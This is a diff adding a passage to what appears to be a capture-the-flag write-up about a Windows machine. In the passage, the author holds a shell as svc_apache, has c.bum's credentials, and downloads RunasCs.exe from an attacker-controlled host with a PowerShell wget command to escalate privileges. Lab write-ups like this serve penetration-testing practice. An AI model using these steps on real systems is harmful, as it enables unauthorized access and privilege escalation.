@@ -594,3 +594,27 @@ There also appears to be a directory in `inetpub` called `development` im starti
 
 Looking at the privs i can see that it can be owned by `c.bum` i know his creds so i can simply upload RunAsCs.exe to see whats there
 
+```python
+SHELL> pwd
+
+Path                         
+----                         
+C:\Users\svc_apache\Documents
+
+
+SHELL>powershell -c wget http://10.10.14.90:443/RunasCs.exe -o rac.exe
+SHELL> dir
+
+
+    Directory: C:\Users\svc_apache\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        3/31/2026   5:39 PM          51712 rac.exe    
+```
+Ive uploaded RunAsCs.exe to the target via a python webserver
+
+```python
+
+```
